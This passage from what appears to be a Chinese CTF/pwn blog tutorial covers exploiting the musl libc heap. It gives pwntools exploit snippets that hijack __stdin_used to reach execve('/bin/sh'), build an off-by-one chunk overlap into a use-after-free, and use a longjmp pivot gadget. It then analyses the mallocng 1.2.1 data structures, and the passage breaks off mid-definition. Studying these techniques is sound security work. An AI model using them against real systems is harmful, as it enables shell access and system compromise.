<p>观察上面的<code>__stdio_exit</code>函数，我们可以发现，其实它最后使用的是<code>__stdin_used</code>，而这个数据保存着stdin结构体指针，并且该数据位于libc上可读可写处，也就是说，我们可以尝试劫持<code>__stdin_used</code>下的stdin结构体指针到堆上，在堆上伪造我们的数据，从而在调用exit函数时从堆上取数据执行最终的命令。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = libc_base + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">stdin_usedpoint_addr = libc_base + <span class="number">0x292430</span></span><br><span class="line">heap_addr = <span class="number">0x555555759000</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_usedpoint_addr-<span class="number">0x10</span>-<span class="number">0x8</span>)+p64(heap_addr+<span class="number">0x50</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>+<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(execve_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>可以看到，在最后的执行命令处，rdi被成功更改为堆上的地址，并且也是对应寻找偏移找到了<code>execve</code>函数地址，更加简便了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png" alt="image-20220217193622906"></p>
<p>同时由于最后调用的<code>f-&gt;write(f,0,0)</code>，其中rsi和rdx必定为0，所以推荐还是使用execve函数，防止system函数出现非预期的一些栈环境或者其他变化，导致无法getshell。</p>

        <h5 id="方法三："   >
          <a href="#方法三：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h5>
      <p>同样的，如果是ORW，再进一步的话，是不是musl中也存在类似于setcontext之类可以甚至栈的gadget呢，其实是有的，在<code>longjmp</code>函数中，</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1.1.24的libc中</span><br><span class="line">.text:0000000000048B96                 mov     rdx, [rdi+30h]</span><br><span class="line">.text:0000000000048B9A                 mov     rsp, rdx</span><br><span class="line">.text:0000000000048B9D                 mov     rdx, [rdi+38h]</span><br><span class="line">.text:0000000000048BA1                 jmp     rdx</span><br></pre></td></tr></table></div></figure>

<p>相对应在1.2.0以上版本中也是有类似的，也在<code>longjmp</code>函数中，那么我们就可以将<code>__stdin_used</code>劫持为堆地址，在堆上布置下我们的ORW来进行攻击</p>

        <h4 id="②off-by-one"   >
          <a href="#②off-by-one" class="heading-link"><i class="fas fa-link"></i></a><a href="#②off-by-one" class="headerlink" title="②off-by-one"></a>②off-by-one</h4>
      <p>一般在Musl环境下的堆题，基本不存在off-by-null的情况的，因为当前chunk的csize会和下一个chunk的psize进行比对，如果不等会crash。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__bin_chunk函数中</span></span><br><span class="line"><span class="comment">//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">//相当于检测pre_size和size</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></div></figure>

<p>而由于不重用psize字段，就算溢出一个零字节，也无法覆盖到csize字段，只能覆盖到pszie字段，所以当可以溢出一个任意字节时，我们就可以修改psize字段，向上进行堆块重叠合并。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></div></figure>

<p>这样chunk0和chunk1就会合并到一块进入bin中，制造chunk1的堆块重叠，但是由于函数机制问题，chunk2实际上是并没有被释放到bin中的。</p>

        <h5 id="未合并前如下："   >
          <a href="#未合并前如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#未合并前如下：" class="headerlink" title="未合并前如下："></a>未合并前如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png" alt="image-20220218113100251"></p>

        <h5 id="合并后如下："   >
          <a href="#合并后如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并后如下：" class="headerlink" title="合并后如下："></a>合并后如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png" alt="image-20220218113620389"></p>
<p>那么之后将chunk1释放，在将chunk0+chunk1申请回来，即可制造一个UAF了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_malloc(<span class="number">0x80</span>-<span class="number">0x10</span>)</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png" alt="image-20220218120440262"></p>
<p>有了UAF之后就好办很多了，还是参考上述的UAF情况</p>

        <h1 id="二、1-2-1及之后版本"   >
          <a href="#二、1-2-1及之后版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、1-2-1及之后版本" class="headerlink" title="二、1.2.1及之后版本"></a>二、1.2.1及之后版本</h1>
      <p>这个版本下的堆管理方式有了很大的变化，可以说和原来的都不是一个东西了。</p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293" >新版musl-libc malloc源码分析与调试 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-2" >从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929" >musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-数据结构-1"   >
          <a href="#1-数据结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构-1" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构-1"   >
          <a href="#1-chunk结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构-1" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <p>在该版本之后，并没有像之前一样将chunk结构定义在代码里，所以我们只能自己来进行猜测，大致如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> res;        <span class="comment">// 保留,一直为\x00</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx:<span class="number">5</span>;      </span><br><span class="line">    <span class="comment">//低5bit作为idx表示这是group中第几个chunk, 高3bit作为reserved</span></span><br><span class="line">    <span class="comment">//如果该chunk被free，则该字节被置为0xff,同时下面的offset被置为0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> reserved:<span class="number">3</span>;  <span class="comment">// 不知道干啥的</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset;     <span class="comment">//与第一个chunk的偏移</span></span><br><span class="line">    					<span class="comment">//如果为4则chunk_addr-0x40=first_chunk_addr</span></span><br><span class="line">    <span class="comment">/*如果是group中的第一个chunk，那么还有如下数据</span></span><br><span class="line"><span class="comment">    struct meta* meta;//指向管理该group的meta</span></span><br><span class="line"><span class="comment">	unsigned char active_idx:5;//占据5bytes,表示该group中共有几个slot,也就是chunk</span></span><br><span class="line"><span class="comment">	char pad[UNIT - sizeof(struct meta *) - 1];</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[];    <span class="comment">// 最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">char</span> remain_data[];  <span class="comment">// 剩余空间最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">uint32_t</span> remain_size; <span class="comment">// chunk剩余size大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下图所示，chunk分布大概如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203181141533.png" alt="image-20220318114135427"></p>
<p>其中chunk1的idx即为该group中的第1个Chunk，为0x1</p>
<p>而这整片开辟的空间，包括未被分配的chunk，如下面的马赛克部分且一直向下延申到一定位置，连在一起叫做<code>group</code></p>

        <h3 id="2-group"   >
          <a href="#2-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-group" class="headerlink" title="(2)group"></a>(2)group</h3>
      <p>也就是通过mmap开辟出来用来存放chunk的一片空间，定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">//即上图头部chunk0中的第一个指针地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;<span class="comment">//占据5bytes</span></span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];</span><br><span class="line">    <span class="comment">//即从头部chunk0从0x41开始一直往下的部分，包括chunk1,chunk2..以及未被分配出去的Chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>且group中存放的Chunk的size是在一个范围内，通过如下定义以及计算</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IB 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_ctz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> a_clz_32</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_clz_32(x&amp;-x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> debruijn32[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">14</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> debruijn32[(x&amp;-x)*<span class="number">0x076be629</span> &gt;&gt; <span class="number">27</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_clz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_ctz_32(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">size_to_class</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关汇总计算如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0x0     ~ 0xc -&gt;0</span><br><span class="line">0xd     ~ 0x1c -&gt;1</span><br><span class="line">0x1d    ~ 0x2c -&gt;2</span><br><span class="line">0x2d    ~ 0x3c -&gt;3</span><br><span class="line">0x3d    ~ 0x4c -&gt;4</span><br><span class="line">0x4d    ~ 0x5c -&gt;5</span><br><span class="line">0x5d    ~ 0x6c -&gt;6</span><br><span class="line">0x6d    ~ 0x7c -&gt;7</span><br><span class="line">0x7d    ~ 0x8c -&gt;8</span><br><span class="line">0x8d    ~ 0x9c -&gt;9</span><br><span class="line">0x9d    ~ 0xbc -&gt;10</span><br><span class="line">0xbd    ~ 0xec -&gt;11</span><br><span class="line">0xed    ~ 0x11c -&gt;12</span><br><span class="line">0x11d   ~ 0x13c -&gt;13</span><br><span class="line">0x13d   ~ 0x18c -&gt;14</span><br><span class="line">0x18d   ~ 0x1ec -&gt;15</span><br><span class="line">0x1ed   ~ 0x23c -&gt;16</span><br><span class="line">0x23d   ~ 0x29c -&gt;17</span><br><span class="line">0x29d   ~ 0x31c -&gt;18</span><br><span class="line">0x31d   ~ 0x3ec -&gt;19</span><br><span class="line">0x3ed   ~ 0x47c -&gt;20</span><br><span class="line">0x47d   ~ 0x53c -&gt;21</span><br><span class="line">0x53d   ~ 0x65c -&gt;22</span><br><span class="line">0x65d   ~ 0x7ec -&gt;23</span><br><span class="line">0x7ed   ~ 0x91c -&gt;24</span><br><span class="line">0x91d   ~ 0xa9c -&gt;25</span><br><span class="line">0xa9d   ~ 0xcbc -&gt;26</span><br><span class="line">0xcbd   ~ 0xfec -&gt;27</span><br><span class="line">0xfed   ~ 0x123c -&gt;28</span><br><span class="line">0x123d  ~ 0x153c -&gt;29</span><br><span class="line">0x153d  ~ 0x198c -&gt;30</span><br><span class="line">0x198d  ~ 0x1fec -&gt;31</span><br><span class="line">0x1fed  ~ 0x247c -&gt;32</span><br><span class="line">0x247d  ~ 0x2a9c -&gt;33</span><br><span class="line">0x2a9d  ~ 0x331c -&gt;34</span><br><span class="line">0x331d  ~ 0x3fec -&gt;35</span><br><span class="line">0x3fed  ~ 0x490c -&gt;36</span><br><span class="line">0x490d  ~ 0x553c -&gt;37</span><br><span class="line">0x553d  ~ 0x664c -&gt;38</span><br><span class="line">0x664d  ~ 0x7fec -&gt;39</span><br><span class="line">0x7fed  ~ 0x923c -&gt;40</span><br><span class="line">0x923d  ~ 0xaa9c -&gt;41</span><br><span class="line">0xaa9d  ~ 0xccbc -&gt;42</span><br><span class="line">0xccbd  ~ 0xffec -&gt;43</span><br><span class="line">0xffed  ~ 0x1247c -&gt;44</span><br><span class="line">0x1247d ~ 0x1553c -&gt;45</span><br><span class="line">0x1553d ~ 0x1997c -&gt;46</span><br></pre></td></tr></table></div></figure>

<p>也就是说一个group中的chunk大小范围要么是<code>0x0 ~ 0xc </code>，要么是<code>0xd~ 0x1c</code>，依次类推。且依据上述转换表，一个范围对应一个索引，该索引即用来寻找meta的索引。</p>

        <h3 id="3-meta"   >
          <a href="#3-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-meta" class="headerlink" title="(3)meta"></a>(3)meta</h3>
      <p>而用来管理group的结构称为meta，一个meta对应一个group，而上面结构定义中的group中的meta指针即指向管理本group的meta，其定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="comment">//存在多个meta，通过循环双向链表串联起来</span></span><br><span class="line">    <span class="comment">//释放之后有用,没有释放的则指向本身</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">//指向本meta管理的group</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//freed_mask是当前meta的group中被free的chunk的bitmap, 4bytes</span></span><br><span class="line">    <span class="comment">//avail_mask是当前meta的group中目前可用chunk的bitmap, 4bytes</span></span><br><span class="line">   	<span class="comment">//由于是4bytes，总共32bit，那么最多可有32个chunk</span></span><br><span class="line">    <span class="comment">//这里很奇怪啊，直接0/1表示可用不可用呗，那要是某个chunk在这两个free和avail的bitmap</span></span><br><span class="line">    <span class="comment">//中对应的bit都为1或都为0又怎么算呢</span></span><br><span class="line">    <span class="comment">//这里好像被free的chunk其freed_mask对应的bit会马上被置为1</span></span><br><span class="line">    <span class="comment">//但是avail_mask对应的bit却不会马上置1，暂时标记不可用状态</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">//group中最后一个chunk的idx索引 (5bit)</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">//表示当前meta是否可以被free(1:可以，0:不可以)(1bit)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//由于一个Group中的chunk的size在一个范围内，所以需要通过sizeclass来追踪计算size</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//(6bit)</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-meta-area"   >
          <a href="#4-meta-area" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-meta-area" class="headerlink" title="(4)meta_area"></a>(4)meta_area</h3>
      <p>顾名思义，这个结构就是用来管理meta的，相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> chevck;   		<span class="comment">//校验值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">//下一个分配区，即下一页(0x1000为一页)</span></span><br><span class="line">    <span class="keyword">int</span> nslots;    			<span class="comment">//总共多少个slots</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> 	<span class="comment">//从其中索引其下面的meta</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>分配meta时, 总是先分配一页的内存, 然后划分为多个等待分配的meta区域，meta_arena描述的就是一页内存的最开始部分。</p>

        <h3 id="5-malloc-context"   >
          <a href="#5-malloc-context" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-malloc-context" class="headerlink" title="(5)malloc_context"></a>(5)malloc_context</h3>
      <p>这个就相当于整个分配内存机制总管理的一个结构，类似于glibc中的<code>main_arena</code>相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;     <span class="comment">//有无完成初始化</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;   <span class="comment">//mmap内存总数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span> <span class="comment">//释放的meta组成的队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span>  <span class="comment">//指向可用meta对象</span></span><br><span class="line">    <span class="comment">//可用meta计数、可用meta_area计数、不知道</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span 